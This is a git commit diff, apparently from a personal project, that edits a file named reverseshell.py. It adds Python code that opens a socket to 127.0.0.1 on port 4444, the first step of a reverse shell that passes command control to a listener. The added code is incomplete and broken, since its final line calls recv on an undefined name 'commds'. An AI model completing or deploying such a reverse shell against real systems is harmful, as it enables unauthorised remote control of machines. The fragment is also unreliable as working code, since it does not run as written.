1a2ed9007de74714646b1a1e7af6a352a53b1249
Pooja Nokhwal <poojanokhwal04@gmail.com>
2025-06-04 21:50:10 +0530

    Continued...

--- ReverseShell/reverseshell.py
+++ ReverseShell/reverseshell.py
@@ -1,5 +1,7 @@
-import os
+import socket
 import subprocess
 
-def main():
-    try:
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("127.0.0.1", 4444))
+
+commds.recv(1024).decode()
